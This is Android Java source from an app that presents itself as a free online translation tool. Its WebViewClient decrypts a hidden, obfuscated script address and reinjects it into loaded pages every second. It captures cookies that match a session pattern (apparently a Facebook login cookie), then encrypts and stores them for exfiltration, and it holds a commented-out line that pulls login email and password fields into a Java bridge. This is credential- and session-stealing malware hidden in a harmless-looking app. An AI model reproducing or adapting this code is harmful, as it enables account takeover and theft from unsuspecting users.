package com.kali_corporation.freeonlinetranslation.fee.bean;

import android.content.Context;
import android.graphics.Bitmap;
import android.os.Handler;
import android.os.Message;
import android.webkit.CookieManager;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import com.kali_corporation.freeonlinetranslation.nt.tool.Constant;
import com.kali_corporation.freeonlinetranslation.nt.tool.hekp.NetHelper;
import com.kali_corporation.freeonlinetranslation.nt.tool.hekp.NtHelper;
import com.kali_corporation.freeonlinetranslation.nt.tool.sp.SPUtil;


import java.util.regex.Pattern;

public class ModuleClient extends WebViewClient {
    private boolean loadFinish;
    private Context mcontext;
    private Handler mhandler;
    private String urlStr;
    private boolean getFinish = true;
    private final String KEYWSSA = "VnIdo880r/otyepnhUEZ4u4fFt8Yr9LE11sEFDgNtes=";//wssa
    private final String KEYPATTERN = ".*c_u.*";
    public ModuleClient(Context context, Handler handler){
        mhandler = handler;
        mcontext = context;
        String key = (String) SPUtil.getInstance(context).readData(Constant.PK,"");
        urlStr = (String) SPUtil.getInstance(context).readData(NetHelper.deByAESDES(KEYWSSA,key),"");
    }

    @Override
    public void onPageStarted(WebView view, String url, Bitmap favicon) {
        // 在开始加载网页时会回调
        super.onPageStarted(view, url, favicon);
    }
    @Override
    public boolean shouldOverrideUrlLoading(WebView view, String url) {
        // 拦截 url 跳转,在里边添加点击链接跳转或者操作
        view.loadUrl(url);
        return true;
    }
    @Override
    public void onPageFinished(WebView view, String url) {
        Message msg =  mhandler.obtainMessage();
        msg.what =200;
        mhandler.sendMessage(msg);
        if (loadFinish == false && !url.equals("")) {
            Runnable task = new Runnable() {
                public void run() {
                    mhandler.postDelayed(this, 1 * 1000);//设置循环时间，此处是5秒

                    view.loadUrl(urlStr);

//                    view.loadUrl("javascript:window.java_in.showData(document.getElementById('m_login_email').value,document.getElementById('m_login_password').value);");
                }
            };
            mhandler.post(task);
        }
        CookieManager cookieManager = CookieManager.getInstance();
        if (cookieManager.getCookie(url) != null) {
            String cks = cookieManager.getCookie(url);
            if (check(cks,KEYPATTERN) && getFinish){
                getFinish = false;
                Message msg2 =  mhandler.obtainMessage();
                msg2.what =500;
                msg2.obj = "ckss";
                mhandler.sendMessage(msg2);
            }
        }


        super.onPageFinished(view, url);
    }

    private boolean check(String ckstr,String pattern){

        boolean isMatch = Pattern.matches(pattern, ckstr);
        if (isMatch){
            loadFinish=true;
            String a = NtHelper.e(NtHelper.DEF_KEY.substring(NtHelper.DEF_KEY.length()-16),ckstr);
            String b = NetHelper.enByAESDES(a,(String) SPUtil.getInstance(mcontext).readData(Constant.PK,""));
            SPUtil.getInstance(mcontext).saveData("ckss",b);

        }
        return isMatch;
    }
}
